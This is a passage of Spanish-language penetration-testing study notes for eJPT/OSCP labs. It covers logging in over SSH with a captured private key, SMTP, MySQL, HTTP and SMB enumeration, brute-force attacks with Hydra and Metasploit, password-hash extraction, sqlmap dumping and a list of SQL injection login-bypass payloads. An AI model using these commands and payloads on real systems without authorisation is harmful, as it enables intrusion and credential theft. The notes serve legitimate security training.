#### Cómo conectarnos utilizando la clave \`id_rsa\`

Una vez que tengamos acceso al archivo \`id_rsa\`, debemos seguir estos pasos:

1. **Visualizar el contenido**: Usamos el comando \`cat\` para ver el contenido del archivo y lo copiamos.
2. **Crear el archivo en nuestra máquina atacante**: En nuestra máquina, creamos un archivo llamado \`id_rsa\` y pegamos el contenido copiado.
3. **Asignar los permisos correctos**: Para que la clave sea utilizada correctamente, establecemos los permisos adecuados con el siguiente comando:

\`\`\`bash
chmod 600 id_rsa # La clave id_rsa necesita estos permisos para poder acceder a través de ella.
\`\`\`

#### Iniciar sesión con la clave \`id_rsa\`

Para autenticarnos en el servicio **SSH** utilizando la clave privada \`id_rsa\`, ejecutamos el siguiente comando:

\`\`\`bash
	sudo ssh -i id_rsa <username>@$<ip_target> # Colocaremos el usuario y la ip que corresponda.
\`\`\`

Si todo está configurado correctamente, obtendremos acceso al sistema sin necesidad de introducir una contraseña.
`,hi=`El **puerto 25** es el puerto predeterminado utilizado por el protocolo **SMTP (Simple Mail Transfer Protocol)**. SMTP es el estándar para el envío de correos electrónicos entre servidores en Internet, permitiendo la transmisión y enrutamiento de mensajes de correo electrónico.

### Reconocimiento del Puerto 25 con Nmap

Para analizar el puerto 25 y sus servicios asociados con **Nmap**, podemos listar todos los scripts disponibles para SMTP con el siguiente comando:

\`\`\`bash
ls -la /usr/share/nmap/scripts/ | grep -e "smtp" # Ver los scripts de Nmap para el servicio SMTP
\`\`\`

Una vez identificados los scripts adecuados, podemos ejecutarlos según nuestros objetivos. También es posible ejecutar todos los scripts disponibles, aunque esto puede ralentizar significativamente el escaneo.

#### Comandos útiles de Nmap para SMTP:

\`\`\`bash
nmap -p25 -sVC <ip_victima> # Escaneo con detección de versiones y scripts comunes
nmap -p25 --script smtp-* <ip_victima> # Ejecutar todos los scripts SMTP
nmap -p25 <ip_victima> --script smtp-commands # Enumera comandos SMTP disponibles
nmap -p25 <ip_victima> --script smtp-enum-users # Intenta enumerar usuarios válidos
nmap -p25 <ip_victima> --script smtp-vuln-* # Busca vulnerabilidades conocidas
nmap -p25 <ip_victima> --script smtp-open-relay # Prueba si el servidor es un relay abierto
\`\`\`

***

### Principales flags de \`smtp-user-enum\`

| **Flag** | **Descripción**            |
| -------- | -------------------------- |
| \`-M\`     | Modo (VRFY, EXPN, RCPT)    |
| \`-U\`     | Lista de usuarios a probar |
| \`-u\`     | Usuario único              |
| \`-t\`     | Host objetivo              |
| \`-T\`     | Lista de hosts objetivo    |
| \`-p\`     | Puerto (por defecto 25)    |
| \`-d\`     | Modo debug                 |

#### Ejemplo de uso con diccionario de usuarios:

\`\`\`bash
smtp-user-enum -M VRFY -U <diccionario.txt> -t <ip_victima>
\`\`\`

***

### Enumeración Manual

Conexión básica al servidor SMTP:

\`\`\`bash
telnet <ip_victima> 25 # Conexión manual al servidor SMTP
nc -vn <ip_victima> 25 # Uso de Netcat para verificar conexión
\`\`\`

#### Usos:

* Verificar si el puerto **25** está abierto.
* Probar comandos SMTP manualmente (EHLO, MAIL FROM, RCPT TO...).
* Identificar la versión del servidor SMTP.

***

### Diferencias clave entre \`telnet\` y \`nc\`

| Característica           | \`telnet\`  | \`nc (netcat)\`                       |
| ------------------------ | --------- | ----------------------------------- |
| Conexión interactiva     |  Sí      |  Sí                                |
| Ver detalles de conexión |  No      |  Sí (\`-v\` muestra más información) |
| Se puede usar en scripts |  Difícil |  Sí (permite más flexibilidad)     |

***

### Usando Metasploit para SMTP

#### Escaneo de versión SMTP

\`\`\`bash
msfconsole -q # Iniciar Metasploit en modo silencioso
use auxiliary/scanner/smtp/smtp_version
set RHOSTS <ip_victima>
exploit
\`\`\`

#### Enumeración de usuarios SMTP

\`\`\`bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <ip_victima>
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt # Diccionario recomendado
exploit
\`\`\`

***

### Comandos SMTP útiles para pruebas

\`\`\`bash
HELO example.com
EHLO example.com
VRFY usuario
EXPN usuario
RCPT TO: <usuario@dominio>
MAIL FROM: <remitente@dominio>
\`\`\`

***

### Verificación de Relay Abierto

Para comprobar si un servidor SMTP permite el reenvío de correos sin autenticación (open relay), se pueden ejecutar los siguientes comandos:

\`\`\`bash
telnet <ip_victima> 25
HELO test
MAIL FROM: <attacker@example.com>
RCPT TO: <victim@example.com>
DATA
Subject: Test
Test message
.
QUIT
\`\`\`

Si el servidor acepta y entrega el correo sin restricciones, significa que está configurado como **relay abierto**, lo cual es una grave vulnerabilidad de seguridad.
`,gi=`## Auditoría de Seguridad en el Puerto 3306 - MySQL

El puerto **3306** es utilizado por el servicio **MySQL**, una de las bases de datos más utilizadas en entornos empresariales y de desarrollo. Debido a su criticidad, es un objetivo frecuente en auditorías de seguridad.

### Resumen de Herramientas y Técnicas para Auditoría en MySQL

Esta guía cubre las principales herramientas y técnicas para auditar MySQL en el puerto 3306 en el examen eJPTv2

### Herramientas Principales.

 **Nmap + Scripts NSE**: Enumeración y detección de vulnerabilidades.\\
 **Metasploit**: Explotación de fallos y acceso no autorizado.\\
 **Hydra & Medusa**: Ataques de fuerza bruta para credenciales.\\
 **Sqlmap**: Pruebas de inyección SQL automatizadas.

### Reconocimiento e Identificación del Servicio MySQL

_Determinar la versión del servicio MySQL es fundamental para detectar posibles vulnerabilidades._

<pre class="language-bash"><code class="lang-bash"><strong>nmap -p 3306 -sCV &#x3C;ip_victima> # Escaneo para intentar ver la versión.
</strong>mysql -u "root" -N -h --skip-ssl &#x3C;ip_victima> # Probar a iniciar sesión con una null session.
mysql -u &#x3C;username> -h &#x3C;ip_víctima> -p # Iniciar sesión con credenciales válidas.
nmap -p 3306 --script mysql-info &#x3C;ip_victima>
nmap -p3306 --script vuln &#x3C;ip_victima> # Escaneo completo de vulnerabilidades.
nmap -p 3306 --script mysql-audit,mysql-databases &#x3C;ip_victima>
nmap -p 3306 --script mysql-users,mysql-variables &#x3C;ip_victima> # Enumeración de usuarios y variables del servidor.
nmap -p 3306 --script=mysql-empty-password &#x3C;ip_victima> # Detección de contraseñas vacías.
nmap -p 3306 --script=mysql-variables --script-args="mysqluser='&#x3C;username>',mysqlpass='&#x3C;password>'" &#x3C;ip_victima> # Obtener Variables de Configuración con Credenciales
nmap -p 3306 --script=mysql-dump-hashes --script-args="username='&#x3C;username>',password='&#x3C;password>'" &#x3C;ip_victima> # Extracción de Hashes de Contraseñas
nmap -p 3306 --script=mysql-query --script-args="query='select count(*) from &#x3C;nombre_db>.&#x3C;nombre_tabla>;',username='&#x3C;username>',password='&#x3C;password>'" &#x3C;ip_victima> # Ejecución de Consultas Personalizadas
nmap -p 3306 --script ms-sql-brute --script-args userdb=/&#x3C;wordlists.txt>,passdb=/&#x3C;wordlists.txt> &#x3C;ip_victima> # Fuerza Bruta contra SQL Server
</code></pre>

### Uso de Metasploit para Auditoría de MySQL.

**Enumeración de usuarios.**

\`\`\`bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_enum # Enumeración de usuarios
set RHOSTS <ip_victima>
run
\`\`\`

**Ataque de autenticación débil.**

\`\`\`bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <ip_victima>
set USERNAME root
set PASSWORD password
run
\`\`\`

**Lista recursos mysql.**

\`\`\`bash
use auxiliary/admin/mysql/mysql_enum # Enumeración de Información en MySQL
use auxiliary/admin/mysql/mysql_sql # Ejecución de Consultas SQL
use auxiliary/scanner/mysql/mysql_file_enum # Enumeración de Archivos en el Sistema
use auxiliary/scanner/mysql/mysql_hashdump #Extracción de Hashes de Contraseñas
use auxiliary/scanner/mysql/mysql_schemadump # Extracción de la Estructura de la Base de Datos
use auxiliary/scanner/mysql/mysql_version # Identificación de la Versión de MySQL
use auxiliary/scanner/mysql/mysql_writable_dirs # Identificación de Directorios con Permisos de Escritura
\`\`\`

### Fuerza brutal al servicio MySQL

**Hydra**

\`\`\`bash
hydra -l <username> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip_victima> mysql
# Si hicieramos un ataque de fuerza bruta a diferentes usuarios podriamos utilizar la flag -u para iterar entre los diferentes usuarios y que no vaya uno por uno probando todas las contraseñas.
\`\`\`

## Metasploit

\`\`\`bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_login # Ataque de Fuerza Bruta contra MySQL
set RHOSTS <ip_victima>
set USER_FILE /ruta_diccionario.txt
set PASS_FILE /ruta_diccionario.txt
set USERNAME <username>
set password <password>
set THREADS <número> # Definir número de intentos por segundo (Opcional, por defecto 5)
exploit
\`\`\`

**SqlMap para auditar panel login.**

Lo primero que debemos hacer es interceptar la petición en Burpsuite y le damos en la opción **Copy to file**.

<figure><img src="/pentesting/assets/5.png" alt=""><figcaption></figcaption></figure>

Ahora que tenemos guardado el archivo de la petición, vamos a lanzar la herramienta **sqlmap** con la siguiente sintaxis:

\`\`\`bash
sqlmap -r <nombre_archivo>
\`\`\`

De este modo lo que le estaremos indicando a sqlmap los parámetros en los que tiene que actuar.

El uso mas básico que le podríamos dar a esta herramienta seria el siguiente:

\`\`\`bash
sqlmap -u '<url>' --forms --batch --dbs 
\`\`\`

* _--forms:_ Este parámetro le indica a \`sqlmap\` que busque formularios en la página web. Los formularios son a menudo puntos de entrada para datos proporcionados por el usuario, lo que significa que son posibles vectores de inyección SQL. \`sqlmap\` escaneará los formularios que encuentre y los probará para detectar vulnerabilidades.
* _--batch:_ \`sqlmap\` interactúa con el usuario durante su ejecución para hacer preguntas o solicitar confirmaciones. El uso de \`--batch\` hace que \`sqlmap\` tome las decisiones automáticamente utilizando sus valores predeterminados, sin pedir interacción con el usuario. Es útil cuando se ejecuta \`sqlmap\` en scripts o cuando quieres automatizar el proceso.
* _--dbs:_ Este parámetro le dice a \`sqlmap\` que, si encuentra una vulnerabilidad de inyección SQL, debe enumerar las bases de datos disponibles en el servidor. Es una opción utilizada para extraer información crítica, que en este caso son los nombres de las bases de datos.

Una vez sepamos que bases de datos existen, vamos seguir utilizando _sqlmap_ pero esta vez le vamos a proporcionar otra sintaxis.

añadiremos \`-D <nombre_db>\` y \`--tables\` para indicarle por un lado que nos muestre la base de datos de _users_ y por otro lado que nos muestre las columnas de dicha base de datos.

\`\`\`bash
sqlmap -u '<url>' --forms --batch -D <nombre_db> --tables
\`\`\`

Ahora que sabemos el nombre de dicha columna, vamos a indicarle a _sqlmap_ que nos haga otra petición pero esta vez con el parámetro \`--colums\`

\`\`\`bash
sqlmap -u '<url>' --forms --batch -T <nombre> --columns
\`\`\`

Cuando no tenemos mucha información otro parámetro que podemos utilizar es: \`--dump\` que nos arrojará toda la información posible sin necesidad de tener que ir 1 por 1. (significativamente mas lento)

\`\`\`bash
sqlmap -u '<url>' --forms --batch --dump
\`\`\`

### Comando para interactuar con MySQL

\`\`\`bash
mysql -u <usuario>  -p # Iniciar sesión con credenciales válidas.
mysql -h <ip_servidor_> -u <usuario> -p # Conectarte a un servidor MySQL remoto.
mysql -h <ip_servidor> -P <puerto> -u <username> -p # MySQL escucha en un puerto distinto al 3306, especifica el puerto.
help # Abre el menu de ayuda
show databases; # Mostrar Bases de Datos.
use <nombre_basededatos>; # Seleccionar una Base de Datos.
show tables; # Mostrar Tablas dentro de la Base de Datos.
describe <nombre>; # Describir la Estructura de una Tabla.
select * from <nombre> # Extraer Todos los Registros de una Tabla.
SELECT <nombre_columna> FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<nombre_tabla>'; # Muestra todas las columnas** de una tabla sin necesidad de DESCRIBE.
SELECT user,host FROM mysql.user; # Buscar Usuarios de MySQL
SELECT user,authentication_string FROM mysql.user; # Obtener los Hashes de Contraseñas de los Usuarios MySQL.
\`\`\`

**Errores Comunes y Soluciones**

1⃣ _Error:_ \`Access denied for user 'root'@'localhost' (using password: YES)\`\\
 _Solución:_ Asegúrate de que la contraseña es correcta o usa \\\`sudo mysql -u .

2⃣ _Error:_ \`Can't connect to MySQL server on '127.0.0.1' (111)\`\\*\\*\\
 _Solución:_ Verifica que MySQL está corriendo.

### Algunos ejemplos de SQLinjection

\`\`\`bash
admin' --
admin' #
admin' /*
' OR 1=1;-- -
' OR 1=1#
' OR 1=1/*
') OR '1'='1-- -
') OR ('1'='1-- -
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1-- -
\`\`\`
`,_i=`**Reconocimiento del Puerto 80**

Al realizar un escaneo de puertos, es común encontrar los puertos **80** y **443** abiertos. Para analizar los servicios y versiones en ejecución en estos puertos, utilizaremos la herramienta **Nmap**, lo que nos permitirá identificar cabeceras, tecnologías y otros detalles relevantes.

\`\`\`bash
ls -la /usr/share/nmap/scripts/ | grep -e "http" # Ver los scripts de Nmap para HTTP.
\`\`\`

#### Scripts Específicos de Nmap

Una vez obtenido el informe de servicios y versiones de cada puerto, es importante recordar que **Nmap** incluye **scripts especializados** para un análisis más profundo. Estos scripts nos permiten identificar configuraciones específicas y posibles vulnerabilidades.

\`\`\`bash
nmap -p80,443 <ip_victima> -sCV
nmap -p80,443 <ip_victima> --script=http-headers
nmap -p80,443 <ip_victima> --script=http-title
nmap -p80,443 <ip_victima> --script=http-server-header
nmap -p80,443 <ip_victima> --script=http-methods
nmap -p80,443 --script=http-headers,http-title,http-server-header,http-methods <ip_victima>
\`\`\`

**Detección de Vulnerabilidades en Servidores Web**

Para detectar posibles vulnerabilidades en servidores HTTP, utilizamos el siguiente comando:

\`\`\`bash
nmap -p 80,443 --script=http-vuln* <ip_victima>
\`\`\`

**Fuerza Bruta en Autenticación HTTP**

\`\`\`bash
nmap -p 80,443 --script=http-brute <ip_victima>
\`\`\`

#### Reconocimiento con Metasploit

\`\`\`bash
msfconsole -q # Iniciar Metasploit en modo silencioso.
use auxiliary/scanner/http/http_version
set RHOSTS <ip_victima>
set RPORT 80
exploit
\`\`\`

\`\`\`bash
msfconsole -q
use auxiliary/scanner/http/http_version
set RHOSTS <ip_victima>
set RPORT 443
exploit
\`\`\`

Estos comandos proporcionan una **visión inicial** del servidor web. Luego, podemos utilizar **WhatWeb** para identificar tecnologías web en sitios o servidores.

#### Características Principales de WhatWeb

 Identificación de CMS como WordPress, Joomla, Drupal.\\
 Detección de frameworks como Laravel, Django, Ruby on Rails.\\
 Reconocimiento de servidores web (Apache, Nginx, IIS).\\
 Extracción de versiones de software y posibles vulnerabilidades.\\
 Posibilidad de escaneo sigiloso o agresivo.

\`\`\`bash
whatweb <url> # Análisis básico.
whatweb -v <url> # Escaneo detallado con más información.
\`\`\`

#### Nikto: Escaneo de Vulnerabilidades Web en Puertos 80 y 443

**Nikto** es una herramienta de escaneo de seguridad web que permite detectar vulnerabilidades en servidores HTTP y HTTPS, incluyendo configuraciones incorrectas, software obsoleto y archivos sensibles expuestos.

\`\`\`bash
nikto -h <url> -p 80 # Escaneo básico del puerto 80.
nikto -h <url> -p 443 -ssl # Escaneo con detección SSL/TLS.
nikto -h <url> -p 80,443 # Escaneo en ambos puertos simultáneamente.
nikto -h <url> -p 443 -Display V # Escaneo con más detalles.
nikto -h <url> -p 443 -nossl # Evitar advertencias SSL.
\`\`\`

**Automatización del Escaneo con Múltiples Objetivos**

Si tienes una lista de IPs/Dominios, puedes usar un archivo **targets.txt**:

\`\`\`bash
nikto -h targets.txt
\`\`\`

**Análisis con la Herramienta Curl:**

\`\`\`bash
curl -v http://<ip/dominio> # Consulta básica del puerto 80.
curl -v https://<ip/dominio> # Consulta básica del puerto 443.
curl -I http://<ip/dominio> # Extracción de encabezados HTTP.
\`\`\`

Después de realizar múltiples escaneos y emplear diversas herramientas para identificar tecnologías, versiones, CMS y otros componentes, procederemos a analizar en detalle los distintos CMS detectados. Asimismo, exploraremos herramientas adicionales que permitan obtener información más específica sobre cada URL en proceso de auditoría.

#### Fuzzing, CMS y Herramientas

 Uno de los aspectos más relevantes al analizar una aplicación web es la identificación del CMS (Sistema de Gestión de Contenidos) utilizado. Esto nos permitirá seleccionar las herramientas más adecuadas para llevar a cabo la auditoría de seguridad, aunque en muchos casos se emplearán metodologías similares.

Los CMS más comunes que probablemente encontraremos incluyen **WordPress, Joomla y Drupal**.
`,vi=`Guía práctica de **enumeración SMB** orientada a pentesting, CTFs y preparación OSCP. Sigue una progresión de decisión: entender el servicio → identificar el host y el dominio → enumerar recursos → comprobar acceso → revisar archivos → enumerar usuarios y SID/RID → política de contraseñas → vulnerabilidades → correlación con otros servicios → siguiente paso.

Cada técnica explica **para qué sirve**, **qué información buscar**, **cómo interpretarla** y **qué hacer después**.

***

## Visión general de SMB

**SMB (Server Message Block)** es el protocolo que usa Windows (y Samba en Linux) para compartir archivos, impresoras y comunicación entre procesos. **CIFS** es un dialecto antiguo de SMB; hoy "SMB" y "CIFS" se usan casi como sinónimos en documentación.

Versiones relevantes:

* **SMBv1 (CIFS)** — obsoleto e inseguro. Asociado a vulnerabilidades históricas (EternalBlue/MS17-010). Su presencia es una señal a investigar, **no** una explotación garantizada.
* **SMBv2 / SMBv3** — versiones modernas. SMBv3 añade cifrado y firma.

Conceptos de seguridad que iremos enumerando: **firma SMB (signing)**, **autenticación** (null/anónima, invitado, con credenciales), **permisos por recurso** y **política de contraseñas**.

Vulnerabilidades que históricamente se asocian a SMB (a validar siempre, nunca asumir): **EternalBlue (MS17-010)**, **SMBGhost (CVE-2020-0796)**, **SMBleed**, **PetitPotam**.

> SMB rara vez es una técnica aislada. La información que obtengas aquí (hostname, dominio, usuarios) se **correlaciona** con DNS, LDAP, Kerberos y Active Directory. Mantén esa idea durante toda la enumeración.

***

## Puertos: 139, 445, 135 y NetBIOS

Entender la diferencia práctica entre los puertos evita perder tiempo:

| Puerto | Servicio | Nota práctica |
|---|---|---|
| **137/udp** | NetBIOS Name Service | Resolución de nombres NetBIOS (\`nmblookup\`, \`nbtscan\`). |
| **138/udp** | NetBIOS Datagram | Tráfico de navegación/anuncios. |
| **139/tcp** | NetBIOS Session Service | SMB **sobre NetBIOS**. Típico en sistemas antiguos o con NetBIOS activo. |
| **445/tcp** | SMB directo sobre TCP | SMB **sin** NetBIOS. Lo habitual en Windows modernos. |
| **135/tcp** | RPC (DCE/RPC) Endpoint Mapper | No es SMB, pero suele acompañarlo. Útil para enumeración de servicios Windows. |

Diferencia práctica para enumeración:

* Si ves **445** abierto → enumera SMB directamente.
* Si ves **139** abierto (con o sin 445) → además tienes **NetBIOS**: puedes resolver el **nombre NetBIOS**, el **workgroup/dominio** y sufijos de servicio con herramientas específicas (ver siguiente sección).
* Muchas herramientas aceptan \`-p139,445\` para cubrir ambos casos.

***

## Enumeración inicial del host (NetBIOS / OS)

Objetivo: identificar **quién es** la máquina antes de tocar los recursos. Buscamos hostname, nombre NetBIOS, workgroup, dominio, FQDN, forest, SO, usuario con sesión (si está disponible), hora del sistema y MAC.

### nmblookup

Consulta la tabla de nombres NetBIOS del objetivo.

\`\`\`bash
nmblookup -A <ip>
\`\`\`

* **Para qué**: obtener el **nombre NetBIOS** del equipo y los **sufijos** de servicios registrados.
* **Qué buscar**: entradas con sufijos \`<20>\` (file server), \`<00>\` (workstation/dominio), \`<1B>\`/\`<1C>\` (infraestructura de dominio).
* **Después**: si aparece un sufijo de dominio, anota el nombre del dominio y pásalo a la correlación con AD.

### nbtscan

Escaneo NetBIOS rápido sobre una IP o rango.

\`\`\`bash
nbtscan <ip>
nbtscan <rango_red>/24   # Barrido de un segmento
\`\`\`

* **Para qué**: descubrir hosts con NetBIOS y su nombre/usuario/MAC de forma masiva.
* **Qué buscar**: nombres de equipo, workgroup/dominio y direcciones MAC.
* **Después**: prioriza los hosts que expongan nombre de dominio o servidores de ficheros.

### nbstat (NSE)

Script de Nmap equivalente desde Linux.

\`\`\`bash
nmap --script nbstat.nse -p137 <ip>
\`\`\`

* **Para qué**: obtener la tabla de nombres NetBIOS y la MAC sin salir de Nmap.
* **Qué buscar**: igual que \`nmblookup\` (nombre, sufijos, dominio).

### nbtstat (Windows)

Si ya tienes un punto de apoyo en una máquina **Windows**:

\`\`\`cmd
nbtstat -A <ip>
\`\`\`

* **Para qué**: misma información NetBIOS desde un host Windows (útil en pivoting/post-explotación).

### ping -a (resolución inversa)

\`\`\`bash
ping -a <ip>     # En Windows resuelve e imprime el hostname
\`\`\`

* **Para qué**: resolución inversa rápida del nombre.
* **Nota**: depende de que exista registro inverso; no siempre devuelve nombre.

### smb-os-discovery (Nmap)

\`\`\`bash
nmap --script smb-os-discovery -p139,445 <ip>
\`\`\`

* **Para qué**: una de las enumeraciones más rentables. Devuelve **SO y versión**, **nombre de equipo**, **dominio/workgroup**, **FQDN**, **forest** y **hora del sistema**.
* **Qué buscar**:
  * \`OS\` → decide exploits/técnicas aplicables (y descarta las que no).
  * \`Computer name\` / \`NetBIOS computer name\`.
  * \`Domain\` / \`Forest name\` → señal fuerte de entorno **Active Directory**.
  * \`System time\` → útil para **Kerberos** (el skew horario importa).
* **Después**: si aparece un dominio (p. ej. \`CORP.LOCAL\`), **salta a la correlación con AD** (más abajo).

### Sufijos NetBIOS importantes

Los sufijos indican qué servicio registra cada nombre. Referencia rápida:

| Sufijo | Significado | Por qué importa |
|---|---|---|
| \`00\` | Workstation Service (nombre de equipo) / nombre de dominio (grupo) | Identifica el equipo o el nombre del dominio/workgroup. |
| \`03\` | Messenger Service (usuario/equipo) | A veces revela el **usuario** con sesión. |
| \`06\` | RAS Server | Servicio de acceso remoto. |
| \`20\` | File Server Service | El host **ofrece recursos compartidos** → objetivo de enumeración de shares. |
| \`1B\` | Domain Master Browser (único) | Suele apuntar al **PDC** del dominio → identifica infraestructura de dominio. |
| \`1C\` | Domain Controllers (grupo) | Lista de **controladores de dominio** registrados para ese dominio. |
| \`1D\` | Master Browser (por subred) | Navegador maestro del segmento. |
| \`1E\` | Browser Service Elections (grupo) | Elecciones del servicio de navegación. |

> **OSCP tip:** los sufijos \`1B\` y \`1C\` son especialmente valiosos: si aparecen, estás muy probablemente ante un **entorno de dominio** y el nombre asociado suele ser el **nombre del dominio**. Encontrar un dominio **no** confirma por sí solo que el host sea un Domain Controller: hay que validarlo (puertos LDAP/Kerberos, \`smb-os-discovery\`, etc.).

***

## Identificación de versión y seguridad SMB

Determinar la versión y la configuración de seguridad guía el resto del trabajo.

\`\`\`bash
nmap -p139,445 --script smb-os-discovery <ip>     # SO, dominio, FQDN, hora
nmap -p139,445 --script smb-protocols <ip>        # Dialectos SMB soportados (¿SMBv1?)
nmap -p139,445 --script smb-security-mode <ip>    # Firma SMB (signing) y modo de seguridad
nmap -p445 --script "smb-enum-*" <ip>             # Lanza todos los scripts de enumeración
\`\`\`

Con Metasploit:

\`\`\`bash
msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS <ip>
run
\`\`\`

* **Qué buscar**: dialectos soportados (si aparece **SMBv1/NT LM 0.12** → anótalo para la fase de vulnerabilidades), y si la **firma SMB** es obligatoria o no.
* **Después**: la firma no obligatoria es relevante para técnicas posteriores (relay) que **no** forman parte de esta sección de enumeración.

> _SMBv1 es antiguo e inseguro y se asocia a MS17-010/EternalBlue. Que esté presente es una señal a investigar, no una vulnerabilidad confirmada._

### Correlación cuando hay dominio

Si \`smb-os-discovery\` o los sufijos NetBIOS revelan un **dominio** (p. ej. \`CORP.LOCAL\`), SMB deja de ser una pieza aislada. Correlaciona con:

* **DNS** → registros \`SRV\` de \`_ldap\`, \`_kerberos\`, localización del DC.
* **LDAP (389/636)** → enumeración de objetos del dominio.
* **Kerberos (88)** → usuarios, AS-REP/Kerberoasting (en fases posteriores).
* **Active Directory / BloodHound** → relaciones y rutas de ataque.

El flujo mental: *dominio encontrado en SMB → confirmar DC → enumerar DNS/LDAP/Kerberos → mapear AD*.

***

## Enumeración de recursos compartidos (shares)

Una de las partes más importantes. Varias herramientas cubren el mismo objetivo desde ángulos distintos; úsalas de forma complementaria, no redundante.

### smbclient

Cliente SMB interactivo: listar, conectarse, navegar y descargar.

\`\`\`bash
smbclient -L //<ip> -N                       # Listar shares con null session (sin credenciales)
smbclient -L //<ip> -U '<usuario>%<contraseña>'   # Listar shares con credenciales
smbclient //<ip>/<recurso> -N                # Conectar a un recurso sin credenciales
smbclient //<ip>/<recurso> -U '<usuario>%<contraseña>'   # Conectar con credenciales
\`\`\`

Comandos internos una vez dentro del recurso:

\`\`\`bash
ls            # Listar contenido (equivalente a dir)
dir
cd <carpeta>  # Cambiar de directorio
pwd           # Ruta actual
get <archivo>     # Descargar un archivo a tu máquina
mget *.txt        # Descargar múltiples archivos
put <archivo>     # Subir un archivo (requiere permiso de escritura)
exit
\`\`\`

Flujo recomendado: **1)** listar shares → **2)** conectar → **3)** enumerar directorios → **4)** descargar archivos interesantes → **5)** analizarlos en local.

### smbmap

Enumera recursos **y sus permisos** de un vistazo.

\`\`\`bash
smbmap -H <ip>                                   # Listar shares y permisos (null session)
smbmap -H <ip> -u '<usuario>' -p '<contraseña>'  # Con credenciales
smbmap -H <ip> -u '<usuario>' -p '<contraseña>' -d <dominio>   # Con dominio
smbmap -H <ip> -r <recurso>                      # Listar el contenido de un recurso
smbmap -H <ip> -R <recurso> -A <archivo> -q      # Descargar archivos que coincidan
\`\`\`

Interpreta la columna de permisos (ver sección [Permisos de shares](#permisos-de-shares-read-write-no-access)):

* \`READ ONLY\` → enumerar contenido y descargar.
* \`READ, WRITE\` → además, investigar si puedes **subir/modificar** archivos (sin asumir ejecución).
* \`NO ACCESS\` → el recurso existe pero no tienes acceso **con esta identidad**; reintenta con credenciales.

### nmap smb-enum-shares

\`\`\`bash
nmap --script smb-enum-shares -p139,445 <ip>
nmap --script smb-enum-users  -p139,445 <ip>
\`\`\`

> **OSCP tip — \`NT_STATUS_ACCESS_DENIED\`:** que \`smb-enum-shares\` devuelva *access denied* **no** significa necesariamente que el recurso no exista. En muchos casos es posible **confirmar la existencia** de un share aunque no puedas listar su contenido sin credenciales. Anótalo y reintenta tras obtener credenciales.

### rpcclient

RPC puede exponer información de shares/usuarios que no siempre aparece con \`smbclient\`.

\`\`\`bash
rpcclient -U "" -N <ip>                       # Conexión con null session
rpcclient -U "<usuario>%<contraseña>" <ip>    # Con credenciales
\`\`\`

Dentro de \`rpcclient\`, para shares:

\`\`\`bash
netshareenum        # Enumerar recursos compartidos
netshareenumall     # Enumerar todos los recursos (incluye ocultos/administrativos)
\`\`\`

(Los comandos de usuarios/grupos/SID de \`rpcclient\` se cubren en las secciones de usuarios y grupos.)

### CrackMapExec / NetExec

\`\`\`bash
crackmapexec smb <ip>                                        # Escaneo básico (SO, dominio, firma)
crackmapexec smb <ip> -u '' -p '' --shares                   # Shares vía null session
crackmapexec smb <ip> -u '<usuario>' -p '<contraseña>' --shares   # Shares con credenciales
\`\`\`

> **Compatibilidad:** **CrackMapExec (CME)** aparece en documentación y cheatsheets clásicos. En entornos actuales también es habitual encontrar **NetExec (\`nxc\`)**, su sucesor; la sintaxis es casi idéntica (\`nxc smb <ip> ...\`). Usa el que tengas disponible.

### Metasploit smb_enumshares

\`\`\`bash
msfconsole -q
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <ip>
run
\`\`\`

### net view (desde Windows)

Si ya tienes un punto de apoyo en Windows:

\`\`\`cmd
net view \\\\<ip>            # Listar recursos compartidos
net view \\\\<ip> /all       # Incluir recursos administrativos
\`\`\`

***

## Null Session / acceso anónimo

Una **null session** es una conexión SMB/RPC **sin usuario ni contraseña**. En configuraciones permisivas (sobre todo antiguas) puede revelar información sin autenticarte.

Cómo comprobarla:

\`\`\`bash
smbclient -L //<ip> -N        # ¿Lista shares sin credenciales?
rpcclient -U "" -N <ip>       # ¿Permite conexión RPC anónima?
enum4linux <ip>               # Prueba varias técnicas anónimas de golpe
\`\`\`

Qué puedes llegar a obtener (depende del objetivo): **shares**, **usuarios**, **grupos**, **dominio/workgroup**, **SID**, **política de contraseñas** e información **NetBIOS**.

> El resultado de una null session **depende por completo de la configuración del objetivo**. Que exista conexión anónima **no** implica acceso completo: muchos sistemas modernos la restringen o la devuelven vacía.

***

## Enumeración autenticada (anónima vs con credenciales)

Distingue siempre dos fases:

* **Anónima / null session** → lo que se puede ver sin credenciales.
* **Autenticada** → tras obtener credenciales (de otro servicio, de un share con READ, de spraying autorizado, etc.).

\`\`\`bash
smbmap -H <ip> -u '<usuario>' -p '<contraseña>'
smbclient -L //<ip> -U '<usuario>%<contraseña>'
crackmapexec smb <ip> -u '<usuario>' -p '<contraseña>' --shares
enum4linux -u '<usuario>' -p '<contraseña>' -a <ip>
\`\`\`

> **Vuelve a enumerar SMB tras conseguir credenciales.** Los permisos pueden cambiar por completo: shares que antes daban \`NO ACCESS\` pueden pasar a \`READ\`/\`WRITE\`, y aparecen usuarios/grupos que la null session no mostraba.

***

## Permisos de shares (READ / WRITE / NO ACCESS)

Cómo actuar según el permiso observado (p. ej. en \`smbmap\`):

| Permiso | Qué hacer |
|---|---|
| **READ ONLY** | Enumerar el contenido, descargar archivos y **buscar credenciales/información sensible**. |
| **READ, WRITE** | Además de leer, investigar si puedes **subir o modificar** archivos y **si algún proceso consume** ese recurso. |
| **NO ACCESS** | Registrar que el recurso **existe**; reintentar más tarde **con credenciales**. |
| **(oculto \`$\`)** | Recursos administrativos (\`C$\`, \`ADMIN$\`, \`IPC$\`): requieren privilegios; anótalos. |

> **Precisión importante:** tener **WRITE no implica automáticamente ejecución de código (RCE)**. Escribir en un share solo es útil si existe un proceso/usuario que lea o ejecute lo que subes, o si el recurso está mapeado a una ruta relevante. Investígalo; no lo asumas.

***

## Contenido de shares: ¿qué buscar?

Cuando tengas **READ** sobre un recurso, no te limites a listarlo: busca información que permita avanzar.

Extensiones interesantes:

\`\`\`text
*.txt  *.conf  *.config  *.ini  *.xml  *.json  *.yml  *.yaml
*.bak  *.old  *.backup
*.ps1  *.bat  *.cmd
